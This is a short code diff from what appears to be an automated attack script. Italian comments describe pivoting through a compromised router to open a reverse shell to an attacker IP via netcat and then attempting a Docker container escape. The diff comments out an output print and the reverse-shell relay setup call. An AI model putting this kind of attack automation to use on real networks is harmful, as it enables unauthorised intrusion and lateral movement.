@@ -143,7 +143,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                 continue
             
             session=mc.attempt_attack(attack_obj)
-            print(attack_obj.output)
+            #print(attack_obj.output)
 
             #print(session)
             if(session):
@@ -175,7 +175,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                         #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
                         
-                        mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
+                        #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
